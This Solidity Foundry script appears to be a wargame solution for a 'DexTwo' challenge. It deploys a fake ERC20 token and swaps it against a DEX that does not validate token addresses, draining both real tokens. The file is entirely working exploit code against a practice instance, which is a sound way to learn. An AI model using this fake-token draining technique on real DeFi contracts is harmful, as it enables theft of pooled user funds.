// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/23-DexTwo/MyErc20.sol";

interface IDexTwo {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function swap(address from, address to, uint256 amount) external;
    function balanceOf(address token, address account) external view returns (uint256);
}

/**
 * @title Challenge 23 Solution Script
 * @notice Drain both tokens using a fake ERC20 (no token validation in swap)
 */
contract DexTwoSolution is Script {
    address constant INSTANCE = 0x04C2B7791f4B246433b0D536b4cBB82c7C0F5871;

    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address player = vm.addr(deployerPrivateKey);

        IDexTwo dex = IDexTwo(INSTANCE);
        address token1 = dex.token1();
        address token2 = dex.token2();

        vm.startBroadcast(deployerPrivateKey);

        // Deploy fake token and mint tokens
        MyErc20 fakeToken = new MyErc20();
        fakeToken.mint(player, 400);
        fakeToken.approve(INSTANCE, type(uint256).max);

        // Send 100 fake tokens to the dex so the price ratio works out
        fakeToken.mint(INSTANCE, 100);

        // Swap 100 fake -> 100 token1 (ratio: 100 * 100 / 100 = 100)
        dex.swap(address(fakeToken), token1, 100);

        // Now dex has 200 fake tokens. Swap 200 fake -> 100 token2
        dex.swap(address(fakeToken), token2, 200);

        vm.stopBroadcast();

        console.log("Dex token1 balance:", dex.balanceOf(token1, INSTANCE));
        console.log("Dex token2 balance:", dex.balanceOf(token2, INSTANCE));
        console.log("Challenge 23 completed!");
    }
}
